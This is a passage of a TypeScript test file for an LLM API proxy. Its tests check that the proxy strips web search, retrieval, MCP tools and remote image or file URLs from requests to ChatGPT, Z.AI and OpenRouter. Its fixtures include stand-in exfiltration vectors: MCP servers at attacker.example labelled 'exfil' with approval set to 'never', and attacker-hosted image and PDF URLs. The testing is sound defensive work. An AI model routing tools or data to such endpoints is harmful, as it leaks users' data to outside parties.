      const response = await post('chatgpt.com', '/backend-api/codex/responses', compress('zstd', raw), {
        ...CODEX_AUTH,
        'content-encoding': 'zstd',
      });
      expect(response.statusCode, model).toBe(400);
      const error = JSON.parse(response.body) as { error: { message: string } };
      expect(error.error.message).toContain(`model "${model}" searches the web on every request`);
    }
    expect(requests()).toHaveLength(0);
    expect(readFileSync(logFilePath, 'utf-8')).toContain(
      'REJECTED POST chatgpt.com/backend-api/codex/responses - model "gpt-5-search-api" searches the web',
    );
  });

  it('Z.AI responses (Codex): the recording passes the gateway rewriter and loses only web_search, compressed too', async () => {
    await startProxy(makeZaiProvider(zaiProfile, 'codex'));
    const expected = withoutWebSearch(CODEX_ZAI_REQUEST);

    expect((await post('api.z.ai', '/api/v1/responses', CODEX_ZAI_REQUEST, CODEX_AUTH)).statusCode).toBe(200);
    expect(requests()[0].body).toEqual(expected);

    const compressed = compress('zstd', wire(CODEX_ZAI_REQUEST));
    const response = await post('api.z.ai', '/api/v1/responses', compressed, {
      ...CODEX_AUTH,
      'content-encoding': 'zstd',
    });
    expect(response.statusCode).toBe(200);
    expect(requests()[1].body).toEqual(expected);
    expect(requests()[1].headers['content-encoding']).toBeUndefined();

    expect((await post('api.z.ai', '/api/v1/responses', wire(expected), CODEX_AUTH)).statusCode).toBe(200);
    expect(requests()[2].rawBody).toBe(wire(expected).toString());
  });

  it.each([
    ['API plan', zaiProfile, '/api/paas/v4/chat/completions'],
    ['Coding Plan', { ...zaiProfile, plan: 'coding' }, '/api/coding/paas/v4/chat/completions'],
  ] as const)(
    "Z.AI chat (Goose, %s): drops GLM's web_search, retrieval and MCP tools",
    async (_label, profile, path) => {
      await startProxy(makeZaiProvider(profile, 'goose'));
      const response = await post(
        'api.z.ai',
        path,
        {
          model: 'glm-5.3',
          messages: [{ role: 'user', content: 'hi' }],
          tools: [
            CHAT_FUNCTION,
            { type: 'web_search', web_search: { enable: true, search_query: 'secret', search_result: true } },
            { type: 'retrieval', retrieval: { knowledge_id: 'kb_1' } },
            { type: 'mcp', mcp: { server_label: 'x', server_url: 'https://attacker.example/mcp' } },
          ],
        },
        CODEX_AUTH,
      );
      expect(response.statusCode).toBe(200);
      expect(requests()[0].body).toEqual({
        model: 'glm-5.3',
        messages: [{ role: 'user', content: 'hi' }],
        tools: [CHAT_FUNCTION],
      });
      expect(requests()[0].rawBody).not.toContain('attacker.example');
    },
  );

  it.each([
    [
      'responses (Codex)',
      'responses',
      'codex',
      '/api/v1/responses',
      {
        model: 'openai/gpt-4o:online',
        plugins: [{ id: 'web' }],
        tools: [
          FUNCTION_TOOL,
          { type: 'web_search' },
          { type: 'mcp', server_label: 'exfil', server_url: 'https://attacker.example/mcp', require_approval: 'never' },
        ],
        tool_choice: { type: 'mcp', server_label: 'exfil' },
        input: [userMessage({ type: 'input_text', text: 'see' }, HTTP_IMAGE)],
      },
      {
        model: 'openai/gpt-4o',
        tools: [FUNCTION_TOOL],
        input: [userMessage({ type: 'input_text', text: 'see' }, INPUT_PLACEHOLDER)],
      },
      'openrouter+openai-responses sanitizer removed: plugins, model:online, tool:web_search, tool:mcp, ' +
        'tool_choice:mcp, input_image:image_url',
    ],
    [
      'chat (Goose)',
      'chat',
      'goose',
      '/api/v1/chat/completions',
      {
        model: 'openai/gpt-4o:online',
        plugins: [{ id: 'web' }],
        tools: [CHAT_FUNCTION, { type: 'web_search' }],
        messages: [
          {
            role: 'user',
            content: [
              { type: 'text', text: 'see' },
              { type: 'image_url', image_url: { url: 'https://attacker.example/i.png' } },
              // OpenRouter also accepts a URL in file_data and fetches it.
              { type: 'file', file: { filename: 'r.pdf', file_data: 'https://attacker.example/r.pdf' } },
            ],
          },
        ],
      },
      {
        model: 'openai/gpt-4o',
        tools: [CHAT_FUNCTION],
        messages: [{ role: 'user', content: [{ type: 'text', text: 'see' }, CHAT_PLACEHOLDER, CHAT_PLACEHOLDER] }],
      },
      'openrouter+openai-chat-completions sanitizer removed: plugins, model:online, tool:web_search, ' +
        'image_url:image_url.url, file:file.file_data',
    ],
  ] as const)(
    'OpenRouter %s: the OpenAI rules apply behind the OpenRouter layer',
    async (_label, protocol, agent, path, body, expected, logLine) => {
      const logFilePath = join(tempDir, 'session.log');
      logger.setup({ logFilePath });
      await startProxy(makeGatewayProvider(openRouterProfile, protocol, agent));
      const response = await post('openrouter.ai', path, body, CODEX_AUTH);
      expect(response.statusCode).toBe(200);
      const forwarded = requests()[0];
      expect(forwarded.path).toBe(path);
      expect(forwarded.body).toEqual(expected);
      expect(forwarded.rawBody).not.toContain('attacker.example');
      expect(forwarded.headers.authorization).toBe(`Bearer ${REAL_KEY}`);
      expect(readFileSync(logFilePath, 'utf-8')).toContain(logLine);
    },
  );
});
